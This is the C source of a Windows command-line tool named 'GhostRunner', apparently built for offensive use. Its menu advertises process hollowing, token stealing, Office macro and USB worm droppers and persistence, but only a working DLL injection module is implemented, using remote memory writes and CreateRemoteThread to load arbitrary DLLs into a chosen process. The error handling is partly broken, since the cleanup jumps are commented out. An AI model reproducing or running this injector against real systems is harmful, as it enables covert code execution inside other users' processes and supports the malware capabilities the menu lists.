#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <psapi.h>
#include <tchar.h>

// Function prototypes
void showMenu();
void run_dll_injection();
void ListProcesses();
BOOL InjectDLL(DWORD pid, const char* dllPath);

void showMenu() {
    _tprintf(TEXT("   _____ _               _   _____                             \n"));
    _tprintf(TEXT("  / ____| |             | | |  __ \\                            \n"));
    _tprintf(TEXT(" | |  __| |__   ___  ___| |_| |__) |   _ _ __  _ __   ___ _ __ \n"));
    _tprintf(TEXT(" | | |_ | '_ \\ / _ \\/ __| __|  _  / | | | '_ \\| '_ \\ / _ \\ '__|\n"));
    _tprintf(TEXT(" | |__| | | | | (_) \\__ \\ |_| | \\ \\ |_| | | | | | | |  __/ |   \n"));
    _tprintf(TEXT("  \\_____|_| |_|\\___/|___/\\__|_|  \\_\\__,_|_| |_|_| |_|\\___|_|   \n"));
    _tprintf(TEXT("                                                               \n"));
    _tprintf(TEXT("                                                               \n\n\n"));

    _tprintf(TEXT("\nGhostRunner CLI Menu:\n\n"));
    _tprintf(TEXT("Choose module to run:\n"));
    _tprintf(TEXT("1. DLL Injection\n"));
    _tprintf(TEXT("2. Process Hollowing\n"));
    _tprintf(TEXT("3. Remote Thread Injection\n"));
    _tprintf(TEXT("4. Token Stealing\n"));
    _tprintf(TEXT("5. Anti-Debug/Stealth Checks\n"));
    _tprintf(TEXT("6. HTA Loader\n"));
    _tprintf(TEXT("7. Office Macro Dropper\n"));
    _tprintf(TEXT("8. LNK Shortcut Creator\n"));
    _tprintf(TEXT("9. Startup Folder Persistence\n"));
    _tprintf(TEXT("10. Service Path Hijack\n"));
    _tprintf(TEXT("11. USB Worm Dropper\n"));
    _tprintf(TEXT("12. WebDAV/UNC Execution\n"));
    _tprintf(TEXT("13. Exit\n"));
}

// Function to list all running processes
void ListProcesses() {
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        _tprintf(TEXT("[-] Failed to create process snapshot (Error: %d)\n"), GetLastError());
        return;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32)) {
        _tprintf(TEXT("[-] Failed to get first process (Error: %d)\n"), GetLastError());
        CloseHandle(hProcessSnap);
        return;
    }

    _tprintf(TEXT("\nRunning Processes:\n"));
    _tprintf(TEXT("PID\tProcess Name\n"));
    _tprintf(TEXT("----------------------------------------\n"));

    do {
        _tprintf(TEXT("%-8d%s\n"), pe32.th32ProcessID, pe32.szExeFile);
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
}

// Function to inject a DLL into a target process
BOOL InjectDLL(DWORD pid, const char* dllPath) {
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    LPVOID pRemoteBuffer = NULL;
    LPTHREAD_START_ROUTINE pLoadLibrary = NULL;
    BOOL success = FALSE;
    HMODULE hKernel32 = NULL;
    DWORD dwSize = (DWORD)(strlen(dllPath) + 1);

    // Open the target process with minimum required privileges
    hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, pid);
    if (hProcess == NULL) {
        _tprintf(TEXT("[-] Failed to open target process (Error: %d)\n"), GetLastError());
       // goto cleanup;
    }

    // Allocate memory in the target process for the DLL path
    pRemoteBuffer = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pRemoteBuffer == NULL) {
        _tprintf(TEXT("[-] Failed to allocate memory in target process (Error: %d)\n"), GetLastError());
       // goto cleanup;
    }

    // Write the DLL path to the allocated memory
    if (!WriteProcessMemory(hProcess, pRemoteBuffer, dllPath, dwSize, NULL)) {
        _tprintf(TEXT("[-] Failed to write to target process memory (Error: %d)\n"), GetLastError());
       // goto cleanup;
    }

    // Get the address of LoadLibraryA in kernel32.dll
    hKernel32 = GetModuleHandle(TEXT("kernel32.dll"));
    if (hKernel32 == NULL) {
        _tprintf(TEXT("[-] Failed to get handle to kernel32.dll (Error: %d)\n"), GetLastError());
       // goto cleanup;
    }

    pLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA");
    if (pLoadLibrary == NULL) {
        _tprintf(TEXT("[-] Failed to get address of LoadLibraryA (Error: %d)\n"), GetLastError());
       // goto cleanup;
    }

    // Create a remote thread to call LoadLibraryA with our DLL path
    hThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibrary, pRemoteBuffer, 0, NULL);
    if (hThread == NULL) {
        _tprintf(TEXT("[-] Failed to create remote thread (Error: %d)\n"), GetLastError());
       // goto cleanup;
    }

    // Wait for the remote thread to terminate
    WaitForSingleObject(hThread, INFINITE);

    DWORD exitCode = 0;
    if (GetExitCodeThread(hThread, &exitCode)) {
        if (exitCode == 0) {
            _tprintf(TEXT("[-] DLL injection failed (LoadLibrary returned NULL)\n"));
        }
        else {
            _tprintf(TEXT("[+] Successfully injected DLL. Base address: 0x%p\n"), (void*)exitCode);
            success = TRUE;
        }
    }
    else {
        _tprintf(TEXT("[-] Failed to get thread exit code (Error: %d)\n"), GetLastError());
    }

cleanup:
    if (hThread != NULL) CloseHandle(hThread);
    if (pRemoteBuffer != NULL) VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
    if (hProcess != NULL) CloseHandle(hProcess);

    return success;
}

void run_dll_injection() {
    DWORD pid = 0;
    int dllCount = 0;
    char dllPaths[10][MAX_PATH] = { 0 }; // Support up to 10 DLLs

    _tprintf(TEXT("\n=== DLL Injection Module ===\n\n"));

    // List running processes
    ListProcesses();

    // Get target process ID
    _tprintf(TEXT("\n[*] Enter PID of target process: "));
    if (scanf_s("%d", &pid) != 1) {
        _tprintf(TEXT("[-] Invalid input for PID\n"));
        while (getchar() != '\n'); // Clear input buffer
        return;
    }
    getchar(); // Consume newline

    // Get number of DLLs to inject
    _tprintf(TEXT("[*] How many DLLs do you want to inject? (1-10): "));
    if (scanf_s("%d", &dllCount) != 1) {
        _tprintf(TEXT("[-] Invalid input for DLL count\n"));
        while (getchar() != '\n'); // Clear input buffer
        return;
    }
    getchar(); // Consume newline

    if (dllCount < 1 || dllCount > 10) {
        _tprintf(TEXT("[-] Invalid number of DLLs. Please choose between 1-10.\n"));
        return;
    }

    // Get paths for each DLL
    for (int i = 0; i < dllCount; i++) {
        _tprintf(TEXT("[*] Enter full path to DLL #%d: "), i + 1);
        if (fgets(dllPaths[i], MAX_PATH, stdin) == NULL) {
            _tprintf(TEXT("[-] Error reading DLL path\n"));
            return;
        }
        // Remove trailing newline
        size_t len = strlen(dllPaths[i]);
        if (len > 0 && dllPaths[i][len - 1] == '\n') {
            dllPaths[i][len - 1] = '\0';
        }
    }

    // Inject each DLL
    for (int i = 0; i < dllCount; i++) {
        _tprintf(TEXT("\n[+] Attempting to inject DLL: %hs\n"), dllPaths[i]);
        if (InjectDLL(pid, dllPaths[i])) {
            _tprintf(TEXT("[+] Successfully injected DLL #%d\n"), i + 1);
        }
        else {
            _tprintf(TEXT("[-] Failed to inject DLL #%d\n"), i + 1);
        }
    }

    _tprintf(TEXT("\n[+] DLL injection process completed.\n"));
}

int main() {
    int choice = 0;

    while (choice != 13) {
        showMenu();
        _tprintf(TEXT("[*] Choose an option: "));
        if (scanf_s("%d", &choice) != 1) {
            _tprintf(TEXT("[-] Invalid input\n"));
            while (getchar() != '\n'); // Clear input buffer
            continue;
        }
        getchar(); // consume newline

        switch (choice) {
        case 1:
            run_dll_injection();
            break;
            // case 2: run_process_hollowing(); break;
            // case 3: run_remote_thread(); break;
            // case 4: run_token_stealing(); break;
            // case 5: run_anti_debug(); break;
        case 13:
            _tprintf(TEXT("[*] Exiting GhostRunner...\n"));
            break;
        default:
            _tprintf(TEXT("[-] Invalid option.\n"));
            break;
        }

        // Pause before showing menu again
        if (choice != 13) {
            _tprintf(TEXT("\nPress Enter to continue..."));
            while (getchar() != '\n'); // Wait for Enter key
        }
    }
    return 0;
}